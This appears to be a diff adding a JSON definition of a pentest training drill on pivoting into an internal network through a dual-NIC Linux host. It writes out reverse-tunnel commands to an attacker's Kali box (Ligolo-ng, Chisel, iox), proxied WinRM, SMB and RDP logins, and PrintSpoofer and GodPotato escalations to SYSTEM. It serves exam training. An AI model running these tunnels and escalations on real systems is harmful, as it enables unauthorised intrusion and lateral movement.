@@ -1,0 +1,135 @@
+{
+  "id": "pivot-tunnel-workshop",
+  "title": "Pivot Tunnel Workshop",
+  "category": "technique-drill",
+  "source": ["All AD labs"],
+  "designed_by": "ai-composite",
+  "description": "Same topology, 4 attack paths: Ligolo-ng, Chisel, SSH tunnel, iox. PIVOT (Linux dual-NIC) → TARGET1, TARGET2 on internal network. Practice each tunneling method.",
+
+  "introduction": "Pivoting is essential when targets live on internal networks—this workshop drills Ligolo-ng, Chisel, SSH, and iox so you can reach them.",
+  "mental_model": "Think: shell on dual-NIC = tunnel to internal. Pick one method, get it working, then route traffic through it.",
+  "key_principles": [
+    "Ligolo-ng gives native routing; Chisel/SSH need proxychains",
+    "Run agent on pivot, proxy on Kali",
+    "Add internal CIDR to routing table after tunnel up",
+    "proxychains before every internal-target command",
+    "Have backup method if one fails"
+  ],
+
+  "indicators": {
+    "difficulty": 5,
+    "cognitive_load": 4,
+    "enumeration_depth": 1,
+    "rabbit_hole_risk": 1,
+    "time_pressure": 3
+  },
+
+  "mitre": {
+    "tactics": ["TA0001", "TA0007"],
+    "techniques": [
+      {"id": "T1572", "name": "Protocol Tunneling"},
+      {"id": "T1090", "name": "Proxy"},
+      {"id": "T1021.002", "name": "SMB/Windows Admin Shares"}
+    ]
+  },
+
+  "kill_chain_phases": ["T1-Recon", "T6-Pivoting", "T7-Lateral"],
+
+  "environment": {
+    "machine_count": 3,
+    "network_count": 2,
+    "os_distribution": {"windows": 2, "linux": 1},
+    "has_ad": false,
+    "has_pivoting": true,
+    "has_client_side": false
+  },
+
+  "technique_tags": [
+    "ligolo-ng", "chisel", "ssh-tunnel", "iox", "proxychains",
+    "pivot", "tunneling", "socat"
+  ],
+
+  "exam_relevance": {
+    "oscp_exam_format": false,
+    "pen200_modules": [6, 12, 16, 17, 22],
+    "pattern_frequency": "high",
+    "recommended_order": 7
+  },
+
+  "prerequisites": [],
+  "builds_on": [],
+
+  "networks": [
+    {"id": "external", "cidr": "192.168.10.0/24", "label": "External"},
+    {"id": "internal", "cidr": "10.10.20.0/24", "label": "Internal"}
+  ],
+
+  "machines": [
+    {
+      "id": "pivot",
+      "label": "PIVOT",
+      "ip": "192.168.10.100",
+      "os": "Linux",
+      "role": "Pivot (dual-NIC)",
+      "networks": ["external", "internal"],
+      "services": [
+        {"port": 22, "name": "SSH", "version": "", "vulnerabilities": [{"type": "auth", "summary": "Given creds", "leads_to": "shell"}], "commands": ["ssh pivot@192.168.10.100"]},
+        {"port": 80, "name": "HTTP", "version": "nginx", "vulnerabilities": [{"type": "rce", "summary": "Web app RCE", "leads_to": "shell"}], "commands": []}
+      ],
+      "privesc": [{"from": "pivot", "to": "root", "technique": "sudo or SUID", "commands": ["sudo -l", "find / -perm -4000 2>/dev/null"]}],
+      "credentials": [],
+      "alternatives": []
+    },
+    {
+      "id": "target1",
+      "label": "TARGET1",
+      "ip": "10.10.20.10",
+      "os": "Windows",
+      "role": "Internal Target",
+      "networks": ["internal"],
+      "services": [
+        {"port": 445, "name": "SMB", "version": "", "vulnerabilities": [{"type": "auth", "summary": "SMB via tunnel", "leads_to": "local-user"}], "commands": ["proxychains smbclient //10.10.20.10/C$ -U admin"]},
+        {"port": 5985, "name": "WinRM", "version": "", "vulnerabilities": [{"type": "auth", "summary": "WinRM via tunnel", "leads_to": "local-user"}], "commands": ["proxychains evil-winrm -i 10.10.20.10 -u admin -p '<password>'"]}
+      ],
+      "privesc": [{"from": "admin", "to": "SYSTEM", "technique": "PrintSpoofer", "commands": [{"cmd": "PrintSpoofer64.exe -i -c cmd", "rationale": "Why: SeImpersonate on 2019—fast path to SYSTEM"}]}],
+      "credentials": [],
+      "alternatives": []
+    },
+    {
+      "id": "target2",
+      "label": "TARGET2",
+      "ip": "10.10.20.20",
+      "os": "Windows",
+      "role": "Internal Target",
+      "networks": ["internal"],
+      "services": [
+        {"port": 80, "name": "HTTP", "version": "IIS", "vulnerabilities": [{"type": "auth", "summary": "Web via tunnel", "leads_to": "recon"}], "commands": ["proxychains curl http://10.10.20.20"]},
+        {"port": 3389, "name": "RDP", "version": "", "vulnerabilities": [{"type": "auth", "summary": "RDP via tunnel", "leads_to": "local-user"}], "commands": ["proxychains xfreerdp /u:admin /p:'<password>' /v:10.10.20.20"]}
+      ],
+      "privesc": [{"from": "user", "to": "SYSTEM", "technique": "GodPotato", "commands": ["GodPotato-NET4.exe -cmd \"cmd /c whoami\""]}],
+      "credentials": [],
+      "alternatives": []
+    }
+  ],
+
+  "connections": [
+    {"from": "pivot", "to": "target1", "technique": "Ligolo-ng/Chisel/SSH/iox", "requires": "Shell on PIVOT", "pivot": "PIVOT dual-NIC", "path_ids": ["path-ligolo", "path-chisel", "path-ssh", "path-iox"], "commands": [
+      {"cmd": "# Ligolo-ng: agent -connect <kali>:11601 -ignore-cert → ip route add 10.10.20.0/24 dev ligolo", "rationale": "Why: Agent creates tunnel; route sends internal traffic through it"},
+      "# Chisel: chisel server --reverse -p 8000; on PIVOT: chisel client <kali>:8000 R:socks",
+      "# SSH: ssh -D 1080 -N pivot@192.168.10.100 → proxychains",
+      "# iox: iox -l 1080 -r <kali>:1080 → proxychains",
+      {"cmd": "proxychains evil-winrm -i 10.10.20.10 -u admin -p '<password>'", "rationale": "Why: Route WinRM through tunnel to reach internal host"}
+    ]},
+    {"from": "pivot", "to": "target2", "technique": "Tunnel to TARGET2 via PIVOT", "requires": "Active tunnel through PIVOT", "pivot": "PIVOT dual-NIC", "path_ids": ["path-ligolo", "path-chisel", "path-ssh", "path-iox"], "commands": [
+      "proxychains curl http://10.10.20.20",
+      "proxychains xfreerdp /u:admin /p:'<password>' /v:10.10.20.20"
+    ]}
+  ],
+
+  "attack_paths": [
+    {"id": "path-ligolo", "name": "Ligolo-ng", "color": "#6bb8cc", "steps": ["pivot", "target1", "target2"], "description": "ligolo-ng agent on PIVOT → ifconfig tun → ip route add 10.10.20.0/24 dev ligolo"},
+    {"id": "path-chisel", "name": "Chisel", "color": "#e8a87c", "steps": ["pivot", "target1", "target2"], "description": "chisel server --reverse; on PIVOT: chisel client <kali>:8000 R:445:10.10.20.10:445 R:5985:10.10.20.10:5985"},
+    {"id": "path-ssh", "name": "SSH Tunnel", "color": "#85e89d", "steps": ["pivot", "target1", "target2"], "description": "ssh -D 1080 -N pivot@192.168.10.100; proxychains -q -f /etc/proxychains4.conf"},
+    {"id": "path-iox", "name": "iox", "color": "#d2a8ff", "steps": ["pivot", "target1", "target2"], "description": "iox -l 1080 -r <kali-ip>:1080; proxychains"}
+  ]
+}
